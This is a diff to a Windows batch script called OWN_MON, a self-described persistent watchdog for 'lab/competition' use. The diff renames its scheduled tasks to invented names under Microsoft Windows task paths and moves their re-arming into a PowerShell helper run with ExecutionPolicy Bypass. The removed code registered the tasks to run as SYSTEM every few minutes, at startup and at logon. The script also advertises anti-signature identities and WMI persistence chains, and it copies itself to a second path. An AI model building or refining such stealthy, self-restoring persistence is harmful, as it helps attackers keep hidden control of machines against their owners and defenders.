@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M20
+rem  OWN_MON  BUILD 20260802M22
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
 rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
 rem  Authorized internal deployment - lab/competition scope only.
@@ -32,7 +32,7 @@ set "MSICACHE=%WD%\pkg.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M20"
+set "MONVER=M22"
 set "PF86=%ProgramFiles(x86)%"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
@@ -61,10 +61,10 @@ echo %DATE% %TIME% %RANDOM%>"%MUTEX%"
 rem ── per-host identity (anti-signature) ────────────────────────
 if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
 if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
-if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\Scheduled"
-if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\Server"
-if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHost"
-if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpAddressConflict1"
+if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\EvtCacheSync"
+if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\ServerHealth"
+if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHostProxy"
+if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpConflictResolver"
 if not defined MO_A set "MO_A=2"
 if not defined MO_B set "MO_B=3"
 
@@ -96,33 +96,19 @@ if not errorlevel 1 for %%F in ("%WD%\own_mon.next") do if %%~zF GTR 1500 (
 )
 if "%SELF_UPD%"=="0" del /f /q "%WD%\own_mon.next" >nul 2>&1
 
-rem ── [B] re-arm chain 1 (schtasks) if missing ──────────────────
-schtasks /Query /TN "%TASK_A%" >nul 2>&1
-if errorlevel 1 (
-  echo rearm TASK_A %TASK_A%>>"%LOG%"
-  schtasks /Create /F /TN "%TASK_A%" /SC MINUTE /MO %MO_A% /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
-  schtasks /Run /TN "%TASK_A%" >nul 2>&1
+rem ── [B] re-arm chain 1: ownership-aware (not existence-only) ──
+rem L11/M22: Query-only skipped rearm when Windows built-in tasks shared
+rem default names (Diagnosis\Scheduled etc.) -> mon never ran, no log.
+if exist "%WD%\own_lib.ps1" (
+  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
+    echo tasks_ensure %%R>>"%LOG%"
+    set "TASKS_ENSURE=%%R"
+  )
 )
 if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
 if exist "%WD%\own_mon.cmd" (
   attrib -h -s -r "%ETL%\etl_mon.cmd" >nul 2>&1
   copy /y "%WD%\own_mon.cmd" "%ETL%\etl_mon.cmd" >nul 2>&1
-)
-schtasks /Query /TN "%TASK_B%" >nul 2>&1
-if errorlevel 1 (
-  echo rearm TASK_B %TASK_B% etl_mon>>"%LOG%"
-  schtasks /Create /F /TN "%TASK_B%" /SC MINUTE /MO %MO_B% /RU SYSTEM /RL HIGHEST /TR "cmd /c %ETL%\etl_mon.cmd" >>"%LOG%" 2>&1
-  schtasks /Run /TN "%TASK_B%" >nul 2>&1
-)
-schtasks /Query /TN "%TASK_C%" >nul 2>&1
-if errorlevel 1 (
-  echo rearm TASK_C %TASK_C%>>"%LOG%"
-  schtasks /Create /F /TN "%TASK_C%" /SC ONSTART /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
-)
-schtasks /Query /TN "%TASK_D%" >nul 2>&1
-if errorlevel 1 (
-  echo rearm TASK_D %TASK_D%>>"%LOG%"
-  schtasks /Create /F /TN "%TASK_D%" /SC ONLOGON /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
 )
 
 rem ── [B2] re-arm chain 2 (WMI subscription) if missing ─────────
